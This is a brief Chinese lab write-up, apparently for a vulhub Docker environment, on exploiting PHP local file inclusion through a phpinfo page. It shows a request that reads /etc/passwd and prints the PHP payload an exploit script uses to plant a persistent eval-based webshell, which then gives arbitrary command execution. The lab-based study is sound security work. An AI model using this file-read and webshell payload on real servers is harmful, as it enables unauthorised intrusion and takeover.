# PHP文件包含漏洞（利用phpinfo）

## 漏洞环境

执行如下命令启动环境：

```plain
docker compose up -d
```

目标环境是官方最新版PHP7.2，说明该漏洞与PHP版本无关。

环境启动后，访问http://your-ip:8080/phpinfo.php即可看到一个PHPINFO页面，访问http://your-ip:8080/lfi.php?file=/etc/passwd，可见的确存在文件包含漏洞。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780896581499-93ca1f74-17c6-4a6e-8fc6-e6754c4377f1.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780896581621-b303dffe-a54d-4235-b02a-2b1e05947287.png)

## 漏洞复现

利用脚本[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py#tdsub)实现了上述过程，成功包含临时文件后，会执行<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>，写入一个新的文件/tmp/g，这个文件就会永久留在目标机器上。

用python2执行：python exp.py your-ip 8080 100：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780896581445-2b3f3e35-1cf6-4c86-b013-02cce9e435c5.png)

可见，执行到第289个数据包的时候就写入成功。然后，利用lfi.php，即可执行任意命令：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780896581447-7e88220e-810f-4251-85e0-a817d00986a5.png)